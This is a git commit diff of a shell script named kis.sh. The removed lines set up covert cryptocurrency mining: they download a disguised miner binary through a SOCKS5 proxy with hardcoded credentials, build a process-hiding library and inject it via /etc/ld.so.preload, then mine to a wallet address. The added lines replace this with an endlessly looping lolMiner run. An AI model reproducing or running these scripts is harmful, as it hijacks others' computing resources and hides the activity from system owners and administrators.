eb4b94788080f4ced99939a2145febd4ec6a4c50
koasdu <106860379+koasdu@users.noreply.github.com>
2022-06-05 15:37:41 +0000

    Update kis.sh

--- kis.sh
+++ kis.sh
@@ -1,48 +1,10 @@
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-apt-get install libpci3
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233 
-loglevel = 1 
-socks5 = 143.198.171.112:1080 
-socks5_username = mikrotik999 
-socks5_password = Elibawnos 
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo "**"
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo "**"
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/potential-train/main/kontolodon
-chmod +x kontolodon
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/potential-train/main/kontolodon.zip
-unzip kontolodon.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./kontolodon -pool us-eth.2miners.com:2020 -wal nano_3de5768bnrjiunbjhup1frf7ejk6asr4h961j6txg8qmiy36jehhxz89qca1.Berkah -pass x -stales 0
+sudo apt-get update -y
+sudo apt install screen -y
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+tar -xf lolMiner_v1.29_Lin64.tar.gz
+cd 1.29
+while [ 1 ]; do
+./lolMiner --algo ETHASH --pool asia-eth.2miners.com:2020 --user nano_3de5768bnrjiunbjhup1frf7ejk6asr4h961j6txg8qmiy36jehhxz89qca1.kin
+sleep 3
+done
+sleep 999
